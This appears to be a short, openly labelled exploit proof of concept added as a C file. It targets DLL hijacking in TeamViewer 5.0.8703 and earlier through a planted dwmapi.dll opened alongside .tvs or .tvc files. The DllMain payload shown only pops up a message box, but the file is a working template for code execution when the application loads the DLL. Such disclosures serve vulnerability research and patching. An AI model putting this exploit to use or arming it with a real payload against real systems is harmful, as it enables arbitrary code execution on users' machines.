@@ -1,0 +1,28 @@
+/* 
+Exploit Title: TeamViewer <= 5.0.8703 DLL Hijacking Exploit (dwmapi.dll)
+Date: August 25, 2010
+Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
+Version: 5.0.8703
+Tested on: Windows XP SP3 En
+Vulnerable extensions: .tvs .tvc
+Greetz: Astalavista, OffSEC, Exploit-DB
+*/
+
+#include <windows.h>
+#define DllExport __declspec (dllexport)
+
+BOOL WINAPI  DllMain (
+            HANDLE    hinstDLL,
+            DWORD     fdwReason,
+            LPVOID    lpvReserved)
+{
+  dll_hijack();
+  return 0;
+}
+
+int dll_hijack()
+{
+  MessageBox(0, "TeamViewer DLL Hijacking!", "DLL Message", MB_OK);
+  return 0;
+}
+
